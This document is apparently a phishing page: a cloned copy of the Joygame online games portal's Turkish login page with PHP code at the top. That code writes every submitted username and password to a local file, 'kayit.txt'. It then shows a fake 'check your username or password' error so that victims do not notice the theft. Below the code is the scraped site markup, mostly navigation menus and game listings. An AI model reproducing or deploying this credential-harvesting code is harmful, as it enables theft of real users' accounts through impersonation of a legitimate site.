<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>

<html class="js no-mobile desktop no-ie chrome chrome74 hesap-section gradient rgba opacity textshadow multiplebgs boxshadow borderimage borderradius cssreflections csstransforms csstransitions no-touch no-retina fontface domloaded w-375 gt-240 gt-320 lt-480 lt-640 lt-768 lt-800 lt-1024 lt-1280 lt-1440 lt-1680 lt-1920 portrait no-landscape" id="giris-page"><head>


    <base href="//www.joygame.com">
    <meta charset="utf-8">
    <meta property="fb:app_id" content="216435178390193">


    <link rel="dns-prefetch" href="//cdn.joy.ac">
    <meta name="keywords" content="online oyunlar, online oyun, Web Tabanlı, PC Oyunları, Tarayıcı Oyunları, Mobil Oyunlar, online oyun oyna, mmorpg, mmo, rpg, mmofps, mmorts, multiplayer,client, free, mmos">
    <meta name="description" content="Joygame Online Oyunlar ve Dijital Eğlence Portalı. Client, Mobil ve Web Tabanlı Ücretsiz MMO Aksiyon, MMO FPS ve MMORPG Oyunu Sitesi">
    <link href="//fonts.googleapis.com/css?family=Open+Sans:600normal" rel="stylesheet">
    <link rel="apple-touch-icon" href="//cdn.joy.ac/i/112810053/touch-icon-iphone.png">
    <link rel="apple-touch-icon" sizes="76x76" href="//cdn.joy.ac/i/112810053/touch-icon-ipad.png">
    <link rel="apple-touch-icon" sizes="120x120" href="//cdn.joy.ac/i/112810053/touch-icon-iphone-retina.png">
    <link rel="apple-touch-icon" sizes="152x152" href="//cdn.joy.ac/i/112810053/touch-icon-ipad-retina.png">


    

    <title>Giriş Yap - Kayıt Ol - Joygame - Ücretsiz Client, Mobil, Web Tabanlı Online Oyun Portalı</title>

<link href="/Content/joygame?v=l_ClUwVy2hLOYwIVto8tPkrRtzoydzHLUix0VH3vDwk1" rel="stylesheet">



<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
    <script src="/scripts/html5shiv/html5shiv.js"></script>
<![endif]-->



    


    

    <script src="https://connect.facebook.net/signals/config/1777788502318635?v=2.8.47&amp;r=stable" async=""></script><script src="https://connect.facebook.net/signals/plugins/inferredEvents.js?v=2.8.47" async=""></script><script src="https://connect.facebook.net/tr_TR/all.js?hash=73f7b7cb9d7ec0b67277c358af2131c0&amp;ua=modern_es6" async="" crossorigin="anonymous"></script><script id="facebook-jssdk" src="//connect.facebook.net/'+facebookLang+'/sdk.js#xfbml=1&amp;version=v3.2&amp;appId=216435178390193"></script><script src="https://www.googletagservices.com/activeview/js/current/osd.js?cb=%2Fr20100101"></script><script src="https://pagead2.googlesyndication.com/pub-config/r20160913/ca-pub-2250110434319819.js"></script><script src="https://connect.facebook.net/signals/config/916131311736751?v=2.8.47&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="//script.crazyegg.com/pages/scripts/0082/8682.js?432731"></script><script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script async="" type="text/javascript" src="https://www.googletagservices.com/tag/js/gpt.js"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-T5WRQ2"></script><script type="text/javascript">
        var JgGlobal = (function (j) {
            j.Lang = "tr";
            j.ServicesUrl = "https://services.joygame.com";
            return j;
        }(JgGlobal || {}));
    </script>





<link rel="preload" href="https://adservice.google.com.tr/adsid/integrator.js?domain=www.joygame.com" as="script"><script type="text/javascript" src="https://adservice.google.com.tr/adsid/integrator.js?domain=www.joygame.com"></script><link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=www.joygame.com" as="script"><script type="text/javascript" src="https://adservice.google.com/adsid/integrator.js?domain=www.joygame.com"></script><script type="text/javascript" src="https://bservices.joygame.com/Home/LangPhrases/?lang=tr"></script><link type="text/css" rel="stylesheet" href="https://bservices.joygame.com/Content/topbar5.min.css"><script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_2019050901.js" async=""></script><link rel="preload" href="https://pagead2.googlesyndication.com/pagead/js/r20190508/r20190131/show_ads_impl.js" as="script"><script type="text/javascript" src="https://bservices.joygame.com/Home/JsonpTopbarNew/?callback=JG.Topbar5Renderer_&amp;targetElementId=tb-area&amp;siteLang=tr"></script><style type="text/css">.fancybox-margin{margin-right:17px;}</style><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#1d3c78;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style></head>




<body class="ctrlr-hesap act-giris lang-tr">
    




<!-- Start Google Tag Manager -->

<noscript>
    <iframe src="//www.googletagmanager.com/ns.html?id=GTM-T5WRQ2"
            height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<script>
    (function (w, d, s, l, i) {
        w[l] = w[l] || []; w[l].push({
            'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
        }); var f = d.getElementsByTagName(s)[0],
        j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
        '//www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
    })(window, document, 'script', 'dataLayer', 'GTM-T5WRQ2');</script>
<!-- End Google Tag Manager -->

<script>
    

    //(function () {
    //    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    //    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    //    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    //})();
</script>

<script>
  //setTimeout(function() {
  //  if($(".masthead-link").length) {
  //    
  //    console.log("masthead-link var, impression bilgileri oluşturuluyor...");
  //    
  //    ga('create', 'UA-9648572-1', 'auto');
    //        ga('send', 'event', 'Masthead View', 'Çılgın Hırsız 3', 'Görüntülendi');
  //    
  //    // impression kodunu body'e ekle.
  //    var element = document.createElement("img");
  //    element.src = "http://bs.serving-sys.com/serving/adServer.bs?cn=display&c=19&mc=imp&pli=22274113&PluID=0&ord="+new Date().getTime()+"&rtu=-1";
  //    document.body.appendChild(element);
  //    
  //    // masthead linkini manipüle et
  //    var href = $(".masthead-link").attr("href");
  //    href = href.replace("[timestamp]", new Date().getTime());
  //    $(".masthead-link").attr("href",href);
  //    
  //  }
  //},3000);
</script>  


    
    <link href="/Content/icheck/grey.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <style>
        @media all and (max-width:991px) {
            .bannerTest { padding: 0; }
            #TopAdvField, #tb-area, #footer-wrapper { display: none; }
            .container { width: 100%; }
            label { text-align: left !important; }
            [class*='col-'] { width: 90%; margin-left: auto; margin-right: auto; float: none; display: block; }
            br { display: none; }
            .be-a-member { padding: 10px 0 !important; }
        }
    </style>

    <div id="globalAjaxIndicator">
        <div class="indicator"></div>
    </div>

    <div class="adsPlusTopbar">
        <div id="TopAdvField" class="hidden">
            

<style>
    .masthead-game-item { margin: 10px 10px 10px 0; display: inline-block; }
        .masthead-game-item:last-child { margin-right: 0; }
</style>
<div class="tb-container">
</div>
            
        </div>
        <div id="tb-area"><input type="checkbox" id="tb-mobil-menu" style="display:none;">
<div id="tb-wrapper" class="tb-lang-tr">
    <div class="tb-row-container">
        <div id="tb-row1">
            <div class="tb-container">
                

<div id="tb-nav">
    <ul>
        <li class="joycash">
            <a target="_blank" href="http://kurumsal.joygame.com/">
                Hakkımızda
            </a>
        </li>
        <li class="forum">
            <a target="_blank" href="http://www.joygame.com/forum/">
                Forumlar
            </a>
        </li>
       
        <li class="hassub" data-sub="#tb-submenu-support">
            <a href="#">
                Destek
                <span class="tb-caret white"></span>
            </a>

            <ul class="tb-nav-sub" id="tb-submenu-support">
                
                <li>
                    <a href="https://netmarble.zendesk.com/hc/tr/categories/360000306211-%C3%96demeler">
                        Joypara Destek
                    </a>
                </li>
                

                
                <li>
                    <a href="https://netmarble.zendesk.com/hc/tr/">
                        
                        Oyuncu Destek
                        
                    </a>
                </li>
                

                
                <li>
                    <a href="https://www.facebook.com/JoygameInternetKafem/">
                        Kafe Destek
                    </a>
                </li>
                

                
                <li>
                    <a href="http://www.joygame.com/destek/Rehber.aspx">
                        Rehber
                    </a>
                </li>
                

                

                
                <li>
                    <a href="http://www.joygame.com/online-oyunlar-sozlugu">
                        Oyuncu Sözlüğü
                    </a>
                </li>
                

            </ul>

        </li>
    </ul>

</div>


            




<div id="tb-userbox" class="logged-out text-right">
    <a href="#" class="tb-btn tb-btn-fb fb-login active">
        <i class="tb-ico tb-fb-16x16-white"></i>
        Facebook ile Giriş Yap
    </a>
    <a href="#!kayit" class="tb-hashlink tb-btn tb-btn-primary singup show-tooltip active" title="Ücretsiz">
        <i class="tb-ico tb-person-add-16x16-white"></i>
        Üye Ol
    </a>
    <a href="#!giris" class="tb-hashlink tb-btn tb-btn-success signin active">
        <i class="tb-ico tb-person-16x16-white"></i>
        Üye Girişi
    </a>
</div>



<div id="tb-lang-selector">
    <div class="inner">
        <a id="tb-lang-toggler" class="tb-lang-option tb-hashlink" href="#!langselect">
            <span class="lang-text">
                tr
            </span>
            <!--<i class="tb-flg tb-flg-tr"></i>-->
            <span class="tb-caret white"></span>
        </a>
    </div>
</div>

</div>
        </div>
    </div>
    <div id="tb-row2">
        <div class="tb-container">
            <div id="tb-logo">
                <a href="http://www.joygame.com">Joygame</a> 
            </div>

            <label for="tb-mobil-menu" id="tb-menu-btn" style="display:none;">
                <img src="//cdn.joy.ac/i/686672209/cgsb.png" alt="Joygame Menü Aç" class="open">
                <img src="//cdn.joy.ac/i/686672209/cgsj.png" alt="Joygame Menü Kapat" class="close">
            </label>

            <div id="tb-games-menu" class="clearfix">
                
                
                
                
                <a href="http://www.joygame.com/oyunlar" class="menu-item game-menu-item" data-sub="#tb-nav-pcgame">
                    PC Oyunları
                    <!--
                    <span class="tb-caret white"></span>
                    -->
                </a>
                
                
                
                <a href="http://www.joygame.com/mobil-oyunlar" class="menu-item game-menu-item" data-sub="#tb-nav-mobilegames">
                    Mobil Oyunlar
                    <!--
                    <span class="tb-caret white"></span>
                    -->
                </a>
                
                
                
                <a href="http://www.joygame.com/web-tabanli-oyunlar" class="menu-item game-menu-item" data-sub="#tb-nav-browsergames">
                    Web Oyunları
                    <!--
                    <span class="tb-caret white"></span>
                    -->
                </a>
                
                
                
                <a href="#" class="menu-item game-menu-item" data-sub="#tb-nav-flashgame">
                    Flash Oyunlar
                    <!--
                    <span class="tb-caret white"></span>
                    -->
                </a>
                
                
            </div> <!--end of gamesmenu-->

            <a href="https://bill.joygame.com/" id="tb-joycash-link">
                Joypara Yükle
            </a>

            

        </div>

    </div>
    <div id="tb-submenu-container">
    <div class="tb-container">
        
        
        
        
        <div class="tb-games-submenu" id="tb-nav-pcgame">
            <div class="tb-container">
                <!--
                <div class="menu-headline">
                    Heyecan dolu bir dünya seni bekliyor! Oyunlarımızı kolayca kur ve bu heyecana ortak ol!
                </div>
                -->

                <div class="tb-row">
                    <div class="tb-col-5">
                        <ul class="menu-col" style="width:48%;">

<li>

<a href="//joy.ac/4gCw">

Wolfteam

</a>

</li>

</ul>

<ul class="menu-col" style="width:48%;">

<li>

<a href="https://www.houndsonline.com/tr/?utm_source=Joygame&amp;utm_medium=tbm&amp;utm_campaign=houndsjoygamedropdown">

Hounds: The Last Hope

</a>

</li>

<li>

<a href="https://joy.ac/4j1i">

MStar

</a>

</li>

</ul>
                    </div>
                    <div class="tb-col-10 tb-col-omega">
                        <div class="tb-row">
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4eBg">
                                        <img src="//cdn.joy.ac/i/680472390/cg66.png" alt="Wolfteam">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4eBg">
                                        Wolfteam
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://www.houndsonline.com/tr/?utm_source=Joygame&amp;utm_medium=tbm&amp;utm_campaign=houndsjoygamedropdown">
                                        <img src="//cdn.joy.ac/i/687041403/hounds-zombi-dropdown.png" alt="Hounds: The Last Hope">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://www.houndsonline.com/tr/?utm_source=Joygame&amp;utm_medium=tbm&amp;utm_campaign=houndsjoygamedropdown">
                                        Hounds: The Last Hope
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://joy.ac/4j1f">
                                        <img src="//cdn.joy.ac/i/687041403/mstar-dropdown-love.jpg" alt="MStar">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://joy.ac/4j1f">
                                        MStar
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
        
        
        
        <div class="tb-games-submenu" id="tb-nav-mobilegames">
            <div class="tb-container">
                <!--
                <div class="menu-headline">
                    Eğlence artık gittiğin her yerde seninle! Mobil oyunlarımız seni bekliyor.
                </div>
                -->

                <div class="tb-row">
                    <div class="tb-col-5">
                        <ul class="menu-col" style="width:48%;">

<li>

<a href="//play.google.com/store/apps/details?id=com.netmarbletr.momatr">

Paramanya

</a>

</li>

<li>

<a href="//joy.ac/bluestacksgameicons">

Lineage 2: Revolution

</a>

</li>

<li>

<a href="http://smarturl.it/1ffejg">

Iron Throne

</a>

</li>

<li>

<a href="//www.joygame.com/marvel-future-fight">

MARVEL Future Fight

</a>

</li>

<li>

<a href="//joy.ac/4gbG">

Seven Knights

</a>

</li>

</ul>

<ul class="menu-col" style="width:48%;">

<li>

<a href="//buff.ac/4cWM ">

Star Wars™: Force Arena

</a>

</li>

<li>

<a href="//buff.ac/4dkd">

Savaş Meydanı

</a>

</li>

<li>

<a href="http://smarturl.it/k5fiza">

Fishing Strike

</a>

</li>

<li>

<a href="//smarturl.it/jmz8p6">

Destiny Knights

</a>

</li>

<li>

<a href="//smarturl.it/1t8emo">

Phantomgate : The Last Valkyrie

</a>

</li>

</ul>
                    </div>
                    <div class="tb-col-10 tb-col-omega">
                        <div class="tb-row">
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://buff.ac/4drz">
                                        <img src="//cdn.joy.ac/i/687041403/ddbe.png" alt="Paramanya">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://buff.ac/4drz">
                                        Paramanya
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/bluestacksgameicons">
                                        <img src="//cdn.joy.ac/i/694278799/lineage2rev.png" alt="Lineage 2: Revolution">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/bluestacksgameicons">
                                        Lineage 2: Revolution
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://buff.ac/4dAK">
                                        <img src="//cdn.joy.ac/i/694278799/marvel-future-fight-1.png" alt="Marvel Future Fight">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://buff.ac/4dAK">
                                        Marvel Future Fight
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://buff.ac/4dBU">
                                        <img src="//cdn.joy.ac/i/692975933/Netmarble-DestinyKnights-Mobil-Rpg-Dropdown.png" alt="Destiny Knights">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://buff.ac/4dBU">
                                        Destiny Knights
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://buff.ac/4dwF">
                                        <img src="//cdn.joy.ac/i/694278799/knights-chronicle.png" alt="Knights Chronicle">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://buff.ac/4dwF">
                                        Knights Chronicle
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="http://smarturl.it/1ffejg">
                                        <img src="//cdn.joy.ac/i/694278799/ironthrone-.png" alt="Iron Throne">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="http://smarturl.it/1ffejg">
                                        Iron Throne
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//smarturl.it/1t8emo">
                                        <img src="//cdn.joy.ac/i/694278799/phantomgate-posterikon.png" alt="Phantomgate">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//smarturl.it/1t8emo">
                                        Phantomgate
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="https://buff.ac/4cSI">
                                        <img src="//cdn.joy.ac/i/694278799/seven-knights.png" alt="Seven Knights">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="https://buff.ac/4cSI">
                                        Seven Knights
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="http://smarturl.it/r2pkjz">
                                        <img src="//cdn.joy.ac/i/694278799/fishing-strike.png" alt="Fishing Strike">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="http://smarturl.it/r2pkjz">
                                        Fishing Strike
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
        
        
        
        <div class="tb-games-submenu" id="tb-nav-browsergames">
            <div class="tb-container">
                <!--
                <div class="menu-headline">
                    Eğlence tek bir tıkla ekranında! Kurulum yok, beklemek yok.
                </div>
                -->

                <div class="tb-row">
                    <div class="tb-col-5">
                        <ul class="menu-col" style="width:48%;">

<li>

<a href="//www.joygame.com/drakensang/">

Drakensang

</a>

</li>

<li>

<a href="//www.joygame.com/farmerama/">

Farmerama

</a>

</li>

<li>

<a href="//www.joygame.com/skyrama/">

Skyrama

</a>

</li>

<li>

<a href="//www.joygame.com/darkorbit/">

Darkorbit

</a>

</li>

<li>

<a href="//www.joygame.com/piratestorm/">

Pirate Storm

</a>

</li>

</ul>

<ul class="menu-col" style="width:48%;">

<li>

<a href="//www.joygame.com/seafight/">

Seafight

</a>

</li>

<li>

<a href="//www.joygame.com/deepolis/">

Deepolis

</a>

</li>

<li>

<a href="//www.joygame.com/desert-operations/">

Desert Operations

</a>

</li>

<li>

<a href="//joy.ac/Rising_Cities_Oyna">

Rising Cities

</a>

</li>

<li>

<a href="//joy.ac/LPTopBarTitle">

Lady Popular

</a>

</li>

</ul>
                    </div>
                    <div class="tb-col-10 tb-col-omega">
                        <div class="tb-row">
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/LPTopBar">
                                        <img src="//cdn.joy.ac/i/117148735/6iuq.jpg" alt="Lady Popular">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/LPTopBar">
                                        Lady Popular
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4fkR">
                                        <img src="//cdn.joy.ac/i/650716251/Joygame-Dark-Orbit-Web-Tabanli-Oyun-Hakimiyet-Savaslari-Poster.jpg" alt="Dark Orbit">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4fkR">
                                        Dark Orbit
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//joy.ac/4et5">
                                        <img src="//cdn.joy.ac/i/641976512/Joygame-Drakensang-Tarayici-Oyunu-DDM.jpg" alt="Drakensang">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//joy.ac/4et5">
                                        Drakensang
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                            <div class="tb-game-box tb-col-2">
                                <div class="tb-game-cover">
                                    <a href="//www.joygame.com/seafight/">
                                        <img src="//cdn.joy.ac/i/679215924/Seafight_web_game_dropdown.jpg" alt="Seafight">
                                    </a>
                                </div>
                                <div class="tb-game-info">
                                    <a class="tb-game-name" href="//www.joygame.com/seafight/">
                                        Seafight
                                    </a>
                                    <!--<div class="tb-text-muted">
                                        MMOFPS
                                    </div>-->
                                </div>
                                <!--<a href="#" class="tb-game-btn">
                                    Hemen Oyna
                                </a>-->
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
        
        
        
        <div class="tb-games-submenu" id="tb-nav-flashgame">
            <div class="tb-container">
                <!--
                <div class="menu-headline">
                    Eğlence artık gittiğin her yerde seninle! Flash oyunlarımız seni bekliyor.
                </div>
                -->

                <div class="tb-row">
                    <div class="tb-col-5">
                        <ul class="menu-col" style="width:48%;">

<li>

<a href="//www.joygame.com/flash-oyunlar/abc-gizemleri">

Abc Gizemleri

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/futbol-taktikleri">

Futbol Taktikleri

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/kule">

Kule

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/seker-yagmuru">

Şeker Yağmuru

</a>

</li>

<li>

<a href="//www.joygame.com/flash-oyunlar/korsan-koyu">

Korsan Oyunu

</a>

</li>

</ul>

<ul class="menu-col" style="width:48%;">

<li>

<a href="//www.joygame.com/flash-oyunlar/samuray-kacisi">

Samuray Kaçışı

